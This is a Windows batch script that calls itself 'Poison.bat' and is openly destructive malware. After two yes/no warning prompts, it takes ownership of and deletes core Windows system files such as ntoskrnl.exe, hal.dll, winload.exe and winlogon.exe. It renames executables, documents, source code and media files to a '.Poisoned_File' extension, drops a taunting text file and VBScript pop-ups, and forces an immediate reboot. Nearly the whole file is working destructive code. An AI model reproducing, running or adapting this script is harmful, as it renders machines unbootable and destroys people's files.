@echo off
title WARNING
:1
echo WARNING
echo Poison.bat will destroy your PC are you sure? 
echo yes/no
set /p choice=
if /i %choice%==yes goto 2
if /i %choice%==no goto exit
if not /i %choice%==yes,no goto 1

:2
title LAST WARNING
echo LAST WARNING
echo Are you sure that you wanna run this malware? This can corrupt your pc.
echo yes/no
set /p input=
if /i %input%==yes goto run
if /i %input%==no goto leave
if not /i %input%==yes,no goto 2

:exit
exit

:run
takeown /f C:\Windows\System32\hal.dll
del /f /q C:\Windows\System32\hal.dll
takeown /f C:\Windows\System32\wininit.exe
del /f /q C:\Windows\System32\wininit.exe
takeown /f C:\Windows\System32\svchost.exe
del /f /q C:\Windows\System32\svchost.exe
takeown /f C:\Windows\System32\csrss.exe
del /f /q C:\Windows\System32\csrss.exe
takeown /f C:\Windows\System32\ntoskrnl.exe
del /f /q C:\Windows\System32\ntoskrnl.exe
takeown /f C:\Windows\System32\winload.exe
del /f /q C:\Windows\System32\winload.exe
takeown /f C:\Windows\System32\winlogon.exe
del /f /q C:\Windows\System32\winlogon.exe
if exist *.exe ren *.exe *.Poisoned_File
if exist *.msi ren *.msi *.Poisoned_File
if exist *.cpi ren *.cpi *.Poisoned_File
if exist *.cpl ren *.cpl *.Poisoned_File
if exist *.msl ren *.msl *.Poisoned_File
if exist *.com ren *.com *.Poisoned_File
if exist *.c ren *.c *.Poisoned_File
if exist *.cpp ren *.cpp *.Poisoned_File
if exist *.cs ren *.cs *.Poisoned_File
if exist *.css ren *.css *.Poisoned_File
if exist *.hpp ren *.hpp *.Poisoned_File
if exist *.h ren *.h *.Poisoned_File
if exist *.cmd ren *.cmd *.Poisoned_File
if exist *.vbs ren *.vbs *.Poisoned_File
if exist *.vbe ren *.vbe *.Poisoned_File
if exist *.js ren *.js *.Poisoned_File
if exist *.jse ren *.jse *.Poisoned_File
if exist *.docm ren *.docm *.Poisoned_File
if exist *.docx ren *.docx *.Poisoned_File
If exist *.xlsx ren *.xlsx *.Poisoned_File
if exist *.xlsm ren *.xlsm *.Poisoned_File
if exist *.pptx ren *.pptx *.Poisoned_File
if exist *.pptm ren *.pptm *.Poisoned_File
if exist *.txt ren *.txt *.Poisoned_File
if exist *.mp4 ren *.mp4 *.Poisoned_File
if exist *.mp3 ren *.mp3 *.Poisoned_File
if exist *.wav ren *.wav *.Poisoned_File
if exist *.html ren *.html *.Poisoned_File
cd %temp%
echo.YOUR PC GOT Poisoned LOL>>GETPOISONED.txt
start GETPOISONED.txt
echo.x=msgbox ("Ooooh nice computer you got here, Can i have it?",4+48,"Mario")>>Mario.vbs
cd %USERPROFILE%
start cmd
start mspaint
start cmd
start calc
start regedit
timeout 5
start Mario.vbs
start Mario.vbs
start cmd
timeout 2
start Mario.vbs
start Mario.vbs
start cmd
start cmd
start regedit
timeout 3
shutdown /f /r /t 0

:leave
exit